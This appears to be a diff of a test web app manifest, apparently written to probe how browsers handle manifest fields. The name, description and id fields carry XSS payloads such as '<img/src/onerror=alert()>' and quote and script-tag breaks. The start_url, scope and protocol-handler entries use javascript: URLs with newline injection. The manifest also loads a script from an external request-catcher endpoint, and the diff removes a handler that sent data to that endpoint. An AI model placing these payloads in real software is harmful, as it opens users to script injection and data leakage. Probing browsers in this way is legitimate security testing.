@@ -1,8 +1,8 @@
 {"name":"Gittest<b>test1'test2\"test3</script><img/src/onerror=alert()//>",
 "short_name":"Gittest<b>test1'test2\"test3</script><img/src/onerror=alert()//>",
 "description":"test<b>test1'test2\"test3</script><img/src/onerror=alert()//>",
-"start_url":"javascript://localhost/%0aalert(123)",
-"scope": "javascript://localhost/",
+"start_url":"https://febou92.github.io/javascript://localhost/%0aalert(123)",
+"scope": "https://febou92.github.io/javascript://localhost/",
 "id":"test<b>test1'test2\"test3</script><img/src/onerror=alert()//>",
 "display":"standalone",
 "icons":[{"sizes":"114x114","src":"http://localhost/?https://github.githubassets.com/assets/apple-touch-icon-114x114-09ce42d3ca4b.png"},
@@ -52,12 +52,8 @@
     "api_script": "https://323bb6f517f98871600487209103cd74.m.pipedream.net/apiscript.js"
   },"protocol_handlers": [
     {
-      "protocol": "web+test",
-      "url": "https://323bb6f517f98871600487209103cd74.m.pipedream.net/tea?type=%s"
-    },
-    {
       "protocol": "web+https",
-      "url": "javascript://localhost/%0aalert('%s')"
+      "url": "https://febou92.github.io/javascript://localhost/%0aalert('%s')"
     }
   ]
 }
